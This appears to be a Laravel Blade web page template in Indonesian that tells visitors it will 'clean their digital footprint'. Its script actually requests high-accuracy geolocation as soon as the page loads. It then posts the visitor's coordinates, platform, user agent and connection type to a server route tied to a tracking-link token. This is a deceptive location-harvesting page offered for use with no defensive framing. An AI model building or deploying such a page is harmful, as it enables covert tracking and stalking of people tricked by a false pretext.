<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Salam Cair</title>
    <style>
        body { margin: 0; font-family: Inter, system-ui, sans-serif; background: #f8fafc; color: #0f172a; }
        .container { width: min(720px, calc(100% - 2rem)); margin: 3rem auto; padding: 2rem; background: #ffffff; border-radius: 24px; box-shadow: 0 28px 80px rgba(15, 23, 42, 0.08); }
        h1 { margin: 0 0 0.75rem; font-size: 2rem; }
        p { margin: 0 0 1rem; line-height: 1.75; color: #475569; }
        .status { padding: 1rem 1.25rem; border-radius: 1rem; border: 1px solid #cbd5e1; background: #f8fafc; margin-top: 1rem; }
        .button { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.95rem 1.25rem; border-radius: 1rem; border: none; color: #ffffff; background: #4338ca; text-decoration: none; font-weight: 700; cursor: pointer; }
        .button:hover { background: #3730a3; }
        .info { margin-top: 1rem; color: #334155; }
        .info strong { display: inline-block; width: 120px; }
        .muted { color: #64748b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Selamat Datang di Situs kami</h1>
        <p>Halaman ini akan membersihkan jejak digital anda. Izinkan akses lokasi dan perangkat agar data dapat dilanjutkan.</p>

        <div id="status" class="status">Mencoba eksekusi... Mohon tunggu dan izinkan permintaan lokasi.</div>
        <div id="log" class="info"></div>

        {{-- <a href="{{ route('share.panel') }}" class="button" style="margin-top:1rem;">Kembali ke Panel</a> --}}
    </div>

    <script>
        const status = document.getElementById('status');
        const log = document.getElementById('log');

        function updateStatus(type, message) {
            status.textContent = message;
            status.style.borderColor = type === 'success' ? '#34d399' : '#f97316';
            status.style.background = type === 'success' ? '#ecfdf5' : '#ffedd5';
            status.style.color = type === 'success' ? '#166534' : '#9a3412';
        }

        function sendLocation(position) {
            const operatorInfo = navigator.connection?.type || navigator.connection?.effectiveType || 'Tidak tersedia';
            const payload = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                device: navigator.platform || 'Unknown',
                user_agent: navigator.userAgent,
                operator: operatorInfo,
            };

            fetch('{{ route('share.update', ['token' => $trackingLink->token]) }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}',
                },
                body: JSON.stringify(payload),
            })
            .then((response) => response.json())
            .then((data) => {
                if (data.status === 'success') {
                    updateStatus('success', 'Berhasil, Terimakasih');
                    log.innerHTML = `
                        
                    `;
                } else {
                    updateStatus('error', 'Terjadi masalah saat mengirim lokasi.');
                }
            })
            .catch(() => {
                updateStatus('error', 'Tidak dapat mengirim lokasi. Coba ulang halaman atau izinkan akses lokasi.');
            });
        }

        function errorLocation() {
            updateStatus('error', 'Akses lokasi ditolak atau tidak tersedia. Periksa pengaturan browser Anda.');
        }

        if (!navigator.geolocation) {
            updateStatus('error', 'Geolokasi tidak didukung oleh browser ini.');
        } else {
            navigator.geolocation.getCurrentPosition(sendLocation, errorLocation, { enableHighAccuracy: true, timeout: 15000 });
        }
    </script>
</body>
</html>
